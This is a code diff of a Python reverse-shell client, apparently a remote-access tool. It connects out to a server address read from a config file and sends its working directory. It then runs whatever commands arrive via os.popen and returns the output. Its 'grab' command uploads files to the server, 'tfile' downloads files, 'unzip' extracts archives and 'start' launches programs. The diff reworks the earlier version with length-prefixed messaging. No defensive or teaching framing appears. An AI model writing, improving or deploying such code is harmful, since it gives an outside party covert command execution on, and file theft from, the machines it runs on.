@@ -1,75 +1,81 @@
-import socket
 import os
+import socket
+import struct
 import json
-import platform
+from zipfile import ZipFile
 
-def checkOS():
-    if platform.system() == "Windows":
-        print("Windows OS")
-        return "Windows"
-    elif platform.system() == "Linux":
-        print("Linux OS")
-        return "Linux"
-    else:
-        print("Unsupported OS")
-        return "Unix"
-
-if checkOS() == "Windows":
-    with open("config\\config.json") as file:
+try:
+    with open('config.json') as file:
         config = json.load(file)
-elif checkOS() == "Linux":
-    with open("config/config.json") as file:
-        config = json.load(file)
-
-SERVER_HOST = config['server_ip']
-SERVER_PORT = 5003
-BUFFER_SIZE = 1024 * 256
-SEPARATOR = "<sep>"
+except:
+    exit(1)
+buffer_size = 1024 * 4
 
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-    s.connect((SERVER_HOST, SERVER_PORT))
+    s.connect((config['server-ip'], 7777))
     cwd = os.getcwd()
-    s.send(cwd.encode())
-
+    s.sendall(struct.pack('>I', len(cwd.encode())) + cwd.encode())
     while True:
-        command = s.recv(BUFFER_SIZE).decode()
-        splitted_command = command.split()
-        if command == "QUIT":
+        command_len = struct.unpack('>I', s.recv(4))[0]
+        command = s.recv(command_len).decode()
+        split_command = command.split()
+        if command == 'QUIT':
+            s.close()
             break
-        if splitted_command[0].lower() == "cd":
+        if split_command[0].lower() == 'cd':
             try:
-                os.chdir(' '.join(splitted_command[1:]))
+                os.chdir(' '.join(split_command[1:]))
             except FileNotFoundError as e:
                 output = str(e)
             else:
                 output = ""
-        elif splitted_command[0] == 'tfile':
-            obtained_data = b''
-            while True:
-                data = s.recv(BUFFER_SIZE)
-                if not data or data == SEPARATOR.encode():
-                    break
-                obtained_data += data
-            file_name = s.recv(BUFFER_SIZE).decode()
+        elif split_command[0].lower() == 'tfile':
+            file_name = split_command[1]
+            file_size = struct.unpack('>Q', s.recv(8))[0]
+
             with open(file_name, 'wb') as file:
-                file.write(obtained_data)
-            output = "SUCCESS"
-        elif splitted_command[0] == 'start':
+                remaining_size = file_size
+                while remaining_size > 0:
+                    data_size = min(buffer_size, remaining_size)
+                    data = s.recv(data_size)
+                    if not data:
+                        break
+                    file.write(data)
+                    remaining_size -= len(data)
+                file.close()
+            output = f'Successfully Transferred {file_name}'
+        elif split_command[0] == 'unzip':
+            file_name = split_command[1]
+            src = os.getcwd()
+            target_dir = file_name.rsplit('.', 1)[0]
+
+            if not os.path.exists(target_dir):
+                os.makedirs(target_dir)
+
+            with ZipFile(file_name, 'r') as zip:
+                zip.extractall(target_dir)
+            output = f'Unzipped {file_name} Successfully!'
+        elif split_command[0] == 'start':
             os.system(command)
-            output = "SUCCESS"
-        elif splitted_command[0] == 'grab':
-            file_name = s.recv(BUFFER_SIZE).decode()
+            output = f'Successfully Started {split_command[1]}'
+        elif split_command[0] == 'grab':
+            file_path = split_command[1]
+            file_name = os.path.basename(file_path)
+            file_size = os.path.getsize(file_name)
+            print(file_name)
+            s.sendall(struct.pack('>Q', file_size))
             with open(file_name, 'rb') as file:
-                file_data = file.read(BUFFER_SIZE)
-                while file_data:
-                    s.sendall(file_data)
-                    file_data = file.read(BUFFER_SIZE)
-            s.sendall(SEPARATOR.encode())
-            s.sendall(file_name.encode())
-            output = "SUCCESS"
+                data = file.read(buffer_size)
+                while data:
+                    s.sendall(data)
+                    data = file.read(buffer_size)
+                    data_size = len(data)
+            output = f'Successfully Grabbed {file_name}'
         else:
             output = os.popen(command).read()
-        cwd = os.getcwd()
-        message = f"{output}{SEPARATOR}{cwd}"
-        s.send(message.encode())
+        output = output.encode()
+        cwd = os.getcwd().encode()
+        s.sendall(struct.pack('>I', len(output)) + output)
+        s.sendall(struct.pack('>I', len(cwd)) + cwd)
     s.close()
+
